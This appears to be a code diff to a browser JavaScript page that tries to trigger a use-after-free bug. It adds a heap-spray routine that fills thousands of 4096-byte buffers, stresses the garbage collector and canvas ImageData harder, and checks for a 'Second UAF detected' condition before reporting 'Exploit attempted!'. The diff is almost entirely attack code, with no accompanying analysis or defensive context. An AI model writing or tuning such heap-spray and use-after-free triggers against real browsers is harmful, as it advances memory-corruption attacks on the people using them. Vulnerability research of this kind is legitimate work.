@@ -36,9 +36,19 @@
         let attemptCount = 0;
 
         function stressGC() {
-            for (let i = 0; i < 300; i++) {
+            for (let i = 0; i < 500; i++) {
                 new ArrayBuffer(1024 * 1024);
             }
+        }
+
+        function sprayHeap() {
+            const arrays = [];
+            for (let i = 0; i < 8000; i++) {
+                const buf = new Uint8Array(4096);
+                buf.fill(0x44);
+                arrays.push(buf);
+            }
+            return arrays;
         }
 
         function drawOnCanvas() {
@@ -49,6 +59,9 @@
             ctx.fill();
             // Stress with ImageData
             const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+            for (let i = 0; i < imageData.data.length; i++) {
+                imageData.data[i] = Math.random() * 255;
+            }
             ctx.putImageData(imageData, 0, 0);
         }
 
@@ -58,7 +71,7 @@
 
             try {
                 // Intensive drawing
-                const drawInterval = setInterval(drawOnCanvas, 5);
+                const drawInterval = setInterval(drawOnCanvas, 2);
 
                 // Stress with multiple ImageData operations
                 const imageData = ctx.createImageData(512, 512);
@@ -78,10 +91,19 @@
                         return;
                     }
                     stressGC();
+                    const arrays = sprayHeap();
+                    const testBuf2 = new Uint8Array(4096);
+                    testBuf2.fill(0x47);
+                    if (testBuf2[0] !== 0x47) {
+                        status.textContent = 'Second UAF detected!';
+                        clearInterval(drawInterval);
+                        video.pause();
+                        return;
+                    }
                     status.textContent = 'Exploit attempted!';
                     clearInterval(drawInterval);
                     video.pause();
-                }, 500);
+                }, 300);
             } catch (err) {
                 console.error(`Error: ${err.message}`);
                 status.textContent = `Failed: ${err.message}`;
